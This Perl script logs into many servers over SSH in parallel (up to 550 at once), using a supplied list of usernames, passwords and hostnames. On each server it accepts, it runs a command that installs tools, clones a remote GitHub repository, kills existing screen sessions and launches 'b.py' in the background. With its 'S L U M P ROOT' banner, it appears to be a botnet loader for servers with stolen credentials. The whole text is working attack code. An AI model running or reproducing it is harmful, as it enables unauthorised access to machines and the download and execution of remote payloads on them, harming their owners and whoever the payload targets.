#!/usr/bin/perl
use strict;
use warnings;
use Net::SSH2;
use Parallel::ForkManager;

my $file = shift @ARGV;
open(my $fh, '<', $file) or die "Can't read file '$file' [$!]\n";
my @newarray;

while (<$fh>) {
    chomp;  # Remove newline characters
    my @array = split(':', $_);
    push(@newarray, @array);
}

my $pm = Parallel::ForkManager->new(550);

for (my $i = 0; $i < scalar(@newarray); $i += 3) {  # Change to 3 for username, password, hostname
    $pm->start and next;
    my $a = $i;     # Username
    my $b = $i + 1; # Password
    my $c = $i + 2; # Hostname
    my $ssh = Net::SSH2->new();

    print "Attempting to connect to $newarray[$c] on default port 22 with user $newarray[$a]\n";

    if ($ssh->connect($newarray[$c], 22)) {  # Use default port 22
        print "Connected to $newarray[$c]\n";
        if ($ssh->auth_password($newarray[$a], $newarray[$b])) {
            print "Authenticated as $newarray[$a]\n";
            my $channel = $ssh->channel();
            $channel->exec('apt install git && git clone https://github.com/bleedbleedwhywontyoubleed/coolsigma && apt install screen && cd coolsigma && cd bleed && killall screen && screen python3 b.py');
            sleep 10;
            $channel->close;
            print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: " . $newarray[$c] . "\n";
            $| = 1;  # Flush output
        } else {
            print "\e[34;1mAuthentication failed for user $newarray[$a] on $newarray[$c]\n";
            $| = 1;  # Flush output
        }
    } else {
        print "\e[36;1mConnection failed to $newarray[$c] on port 22\n";
        $| = 1;  # Flush output
    }
    $pm->finish;
}

$pm->wait_all_children;